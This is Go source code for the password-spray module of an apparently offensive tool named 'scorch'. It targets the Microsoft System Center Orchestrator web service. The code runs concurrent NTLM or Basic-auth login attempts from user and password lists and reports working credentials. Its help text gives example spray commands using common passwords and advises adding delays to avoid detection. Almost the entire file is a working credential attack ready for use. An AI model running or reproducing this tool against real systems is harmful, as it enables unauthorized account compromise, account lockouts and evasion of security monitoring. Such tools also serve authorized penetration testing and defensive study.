package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"sync"
	"time"
)

type SprayResult struct {
	Username string `json:"username"`
	Password string `json:"password"`
	Success  bool   `json:"success"`
	Code     int    `json:"status_code"`
}

func runSpray(args []string) error {
	if containsHelp(args) {
		printSprayHelp()
		return nil
	}

	opts, remaining, err := parseCommonFlags(args)
	if err != nil {
		return err
	}

	// Parse spray-specific flags
	userFile, remaining := parseFlag(remaining, "-users", "--users")
	passFile, remaining := parseFlag(remaining, "-passwords", "--passwords")
	user, remaining := parseFlag(remaining, "-user", "--user")
	pass, remaining := parseFlag(remaining, "-pass", "--pass")
	delay, remaining := parseFlag(remaining, "-delay", "--delay")
	threads, remaining := parseFlag(remaining, "-threads", "--threads")
	stopOnSuccess, _ := parseBoolFlag(remaining, "-stop", "--stop")

	if err := opts.Validate(); err != nil {
		return err
	}

	// Build user list
	var users []string
	if userFile != "" {
		u, err := readLines(userFile)
		if err != nil {
			return fmt.Errorf("failed to read users file: %w", err)
		}
		users = u
	} else if user != "" {
		users = strings.Split(user, ",")
	} else {
		return fmt.Errorf("-users or -user is required")
	}

	// Build password list
	var passwords []string
	if passFile != "" {
		p, err := readLines(passFile)
		if err != nil {
			return fmt.Errorf("failed to read passwords file: %w", err)
		}
		passwords = p
	} else if pass != "" {
		passwords = strings.Split(pass, ",")
	} else {
		return fmt.Errorf("-passwords or -pass is required")
	}

	// Parse options
	delayDuration := time.Duration(0)
	if delay != "" {
		d, err := time.ParseDuration(delay)
		if err != nil {
			return fmt.Errorf("invalid delay: %w", err)
		}
		delayDuration = d
	}

	numThreads := 1
	if threads != "" {
		fmt.Sscanf(threads, "%d", &numThreads)
	}

	printf(opts, "[*] Password spray against %s\n", opts.Target)
	printf(opts, "    Users: %d, Passwords: %d\n", len(users), len(passwords))
	printf(opts, "    Threads: %d, Delay: %s\n", numThreads, delayDuration)

	// Set up signal handling for graceful shutdown
	ctx, cancel := context.WithCancel(context.Background())
	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, os.Interrupt)
	go func() {
		<-sigChan
		printf(opts, "\n[!] Interrupt received, stopping spray...\n")
		cancel()
	}()
	defer cancel()
	defer signal.Stop(sigChan)

	output, cleanup, err := getOutput(opts)
	if err != nil {
		return err
	}
	defer cleanup()

	// Create work channel with bounded buffer to avoid materializing entire queue
	type work struct {
		user string
		pass string
	}
	workChan := make(chan work, numThreads*2)
	resultChan := make(chan SprayResult, 100)

	// Producer goroutine feeds work incrementally
	go func() {
		defer close(workChan)
		for _, p := range passwords {
			for _, u := range users {
				select {
				case workChan <- work{user: u, pass: p}:
				case <-ctx.Done():
					return
				}
			}
		}
	}()

	// Start workers
	var wg sync.WaitGroup
	stopFlag := false
	var stopMu sync.Mutex

	for i := 0; i < numThreads; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for w := range workChan {
				stopMu.Lock()
				if stopFlag {
					stopMu.Unlock()
					return
				}
				stopMu.Unlock()

				select {
				case <-ctx.Done():
					return
				default:
				}

				result := tryAuth(ctx, opts, w.user, w.pass)
				resultChan <- result

				if result.Success && stopOnSuccess {
					stopMu.Lock()
					stopFlag = true
					stopMu.Unlock()
					return
				}

				if delayDuration > 0 {
					time.Sleep(delayDuration)
				}
			}
		}()
	}

	// Collect results
	go func() {
		wg.Wait()
		close(resultChan)
	}()

	var results []SprayResult
	for r := range resultChan {
		results = append(results, r)
		if r.Success {
			if opts.JSON {
				// Will output all at end
			} else {
				fmt.Fprintf(output, "[+] SUCCESS: %s:%s\n", r.Username, r.Password)
			}
		} else {
			debugf(opts, "Failed: %s (HTTP %d)", r.Username, r.Code)
		}
	}

	if opts.JSON {
		// Filter to only successes for cleaner output
		var successes []SprayResult
		for _, r := range results {
			if r.Success {
				successes = append(successes, r)
			}
		}
		return writeJSON(output, successes)
	}

	// Summary
	successCount := 0
	for _, r := range results {
		if r.Success {
			successCount++
		}
	}
	printf(opts, "\n[*] Complete: %d/%d successful\n", successCount, len(results))

	return nil
}

func tryAuth(ctx context.Context, opts *CommonOpts, username, password string) SprayResult {
	result := SprayResult{
		Username: username,
		Password: password,
	}

	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: opts.SkipVerify},
	}

	var client *http.Client

	// Use NTLM authentication when domain is specified
	if opts.Domain != "" {
		ntlmAuth := &NTLMAuth{
			Domain:   opts.Domain,
			User:     username,
			Password: password,
		}
		client = &http.Client{
			Timeout: opts.Timeout,
			Transport: &NTLMHashTransport{
				Transport: transport,
				Auth:      ntlmAuth,
			},
		}
	} else {
		// Fall back to Basic auth for non-domain scenarios
		client = &http.Client{
			Timeout:   opts.Timeout,
			Transport: transport,
		}
	}

	url := opts.BaseURL() + "/Orchestrator2012/Orchestrator.svc/"
	req, err := http.NewRequestWithContext(ctx, "GET", url, nil)
	if err != nil {
		return result
	}

	// Set Basic auth header only for non-domain auth
	if opts.Domain == "" {
		req.SetBasicAuth(username, password)
	}

	resp, err := client.Do(req)
	if err != nil {
		return result
	}
	defer resp.Body.Close()

	result.Code = resp.StatusCode
	result.Success = resp.StatusCode == http.StatusOK

	return result
}

func readLines(path string) ([]string, error) {
	file, err := os.Open(path)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var lines []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" && !strings.HasPrefix(line, "#") {
			lines = append(lines, line)
		}
	}

	return lines, scanner.Err()
}

func printSprayHelp() {
	fmt.Print(`
scorch spray - Password spray against SCORCH web service

Usage: scorch spray [options]

Target Options:
  -target, -t    Target SCORCH server (required)
  -port, -P      Web service port (default: 81)
  -tls           Use HTTPS
  -k             Skip TLS certificate verification
  -d, -domain    Domain prefix for usernames

Users/Passwords:
  -users         File with usernames (one per line)
  -user          Single username or comma-separated list
  -passwords     File with passwords (one per line)
  -pass          Single password or comma-separated list

Options:
  -delay         Delay between attempts (e.g., 1s, 500ms)
  -threads       Number of concurrent threads (default: 1)
  -stop          Stop on first success

Output:
  -json          JSON output
  -o, -output    Write to file
  -debug         Debug output

Examples:
  # Spray single password against user list
  scorch spray -t scorch.corp.local -d CORP -users users.txt -pass 'Summer2024!'

  # Multiple passwords with delay
  scorch spray -t scorch.corp.local -users users.txt -passwords passes.txt -delay 1s

  # Quick test with specific creds
  scorch spray -t scorch.corp.local -user admin,svc_orch -pass 'P@ssw0rd,Welcome1'

Warning: Password spraying may trigger account lockouts. Use -delay to avoid detection.

`)
}
